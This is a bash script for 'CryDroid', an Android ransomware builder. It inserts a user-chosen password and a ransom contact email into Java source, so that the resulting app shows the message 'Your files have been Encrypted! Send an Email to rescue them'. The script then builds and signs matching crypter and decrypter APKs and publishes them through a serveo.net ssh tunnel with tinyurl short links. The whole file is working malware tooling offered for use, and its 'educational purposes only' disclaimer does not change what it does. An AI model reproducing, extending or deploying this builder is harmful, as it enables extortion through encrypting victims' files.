#!/bin/bash
# CryDroid v1.0
# Author: @thelinuxchoice (You don't become a coder by just changing the credits)
# Instagram: @linux_choice
# Github: https://github.com/thelinuxchoice/crydroid

trap 'printf "\n";stop' 2

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {

command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it: apt-get install apksigner. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }

command -v gradle > /dev/null 2>&1 || { echo >&2 "I require gradle but it's not installed. Install it. Aborting."; 
exit 1; }

}

banner() {

printf "  \e[1;77m                                                .-\"\"-. \n"
printf "                                                 / .--. \ \n"
printf "                                                / /    \ \ \n"
printf "                                                | |    | | \e[0m\n"
printf "  \e[1;92m   ____            ____            _     _ \e[0m\e[1;77m   | |.-\"\"-.| \e[0m\n"
printf "  \e[1;92m  / ___|_ __ _   _|  _ \ _ __ ___ (_) __| |\e[0m\e[1;77m  ///\`.::::.\`\ \n"
printf "  \e[1;92m | |   | '__| | | | | | | '__/ _ \| |/ _\` |\e[0m\e[1;77m ||| ::/  \:: ; \n"
printf "  \e[1;92m | |___| |  | |_| | |_| | | | (_) | | (_| |\e[0m\e[1;77m ||; ::\__/:: ; \n"
printf "  \e[1;92m  \____|_|   \__, |____/|_|  \___/|_|\__,_|\e[0m\e[1;77m  \ \ '::::' / \n"
printf "  \e[1;92m             |___/ \e[0m\e[1;77mv1.0                       \`=':-..-'\` \e[0m\n"
printf "\n"
printf "     \e[1;77mAuthor: https://github.com/thelinuxchoice/crydroid\n\e[0m"
printf "\n"
}

warning() {
printf "\n"
printf " \n  \e[1;41mUsage of CryDroid is COMPLETE RESPONSABILITY of the END-USER. \e[0m\n"
printf "  \e[1;41mDevelopers assume no liability and are NOT responsible for any\e[0m\n"
printf "  \e[1;41mmisuse or damage caused by this program.                      \e[0m\n"
printf "\n"
printf "  \e[1;77mI am using CryDroid for educational purposes only\e[0m\n"
read -p $'  \e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\e[1;93mCopy and paste the above phrase:\e[0m ' end_user

if [[ "$end_user" != "I am using CryDroid for educational purposes only" ]]; then
exit 1
fi 

}

server() {
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting server...\e[0m\n"

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Crypter:\e[0m\e[1;77m %s/crypter.apk \n' $send_link
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Decrypter:\e[0m\e[1;77m %s/decrypter.apk \n' $send_link
printf "\n"
send_ip_crypter=$(curl -s 'http://tinyurl.com/api-create.php?url=$send_link/crypter.apk' | head -n1)
send_ip_decrypter=$(curl -s 'http://tinyurl.com/api-create.php?url=$send_link/decrypter.apk' | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Crypter (tinyurl):\e[0m\e[1;77m %s \n' $send_ip_crypter
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Decrypter (tinyurl):\e[0m\e[1;77m %s \n' $send_ip_decrypter
php -S "localhost:3333" > /dev/null 2>&1 &
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Press Ctrl + C to stop server\e[0m\n"
while [ true ]; do
sleep 3

done 
}

checkapk_decrypter() {
if [[ -e app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/build/outputs/apk/app-release-unsigned.apk decrypter.apk
echo "      " | apksigner sign --ks key.keystore  decrypter.apk > /dev/null

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/decrypter.apk \e[0m\n"
server
else
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m]\e[0m\e[1;93m Build FAIL, exiting...\e[0m\n"
exit 1
fi

}

checkapk_crypter() {
if [[ -e app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/build/outputs/apk/app-release-unsigned.apk crypter.apk
echo "      " | apksigner sign --ks key.keystore  crypter.apk > /dev/null

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/crypter.apk \e[0m\n"
else
printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m]\e[0m\e[1;93m Build FAIL, exiting...\e[0m\n"
exit 1
fi

}

build() {
default_start_build="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
start_build="${start_build:-${default_start_build}}"
if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
cd app/
gradle build
checkapk
else
exit 1
fi
}

decrypt() {

printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Generating Decrypter App...\e[0m\n'
cat decrypter.part1 > app/src/main/java/com/crydroid/MainActivity.java
printf 'String password = "%s";\n' $1 >> app/src/main/java/com/crydroid/MainActivity.java
cat decrypter.part2 >> app/src/main/java/com/crydroid/MainActivity.java
gradle build
checkapk_decrypter
}

crypter() {

cd app/
IFS=$'\n'
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Encryption Password: \e[0m' password

read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Email to request rescue: \e[0m' email_rescue

printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Generating Crypter App...\e[0m\n'

if [[ ! -d app/src/main/java/com/crydroid/ ]]; then
mkdir -p app/src/main/java/com/crydroid/
fi

cat crypter.part1 > app/src/main/java/com/crydroid/MainActivity.java
printf 'String tofile = "Your files have been Encrypted!\\nSend an Email to rescue them: %s";\n' $email_rescue >> app/src/main/java/com/crydroid/MainActivity.java
cat crypter.part2 >> app/src/main/java/com/crydroid/MainActivity.java
printf 'String password = "%s";\n' $password >> app/src/main/java/com/crydroid/MainActivity.java
cat crypter.part3 >> app/src/main/java/com/crydroid/MainActivity.java

gradle build
checkapk_crypter
decrypt "$password"
}

start() {

if [[ -e "app/sendlink" ]]; then
rm -rf app/sendlink 
fi
default_sdk_dir="/root/Android/Sdk"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir

sdk_dir="${sdk_dir:-${default_sdk_dir}}"

if [[ ! -d $sdk_dir ]]; then
printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
sleep 1
start
else
printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
crypter
fi


}
banner
dependencies
warning
start
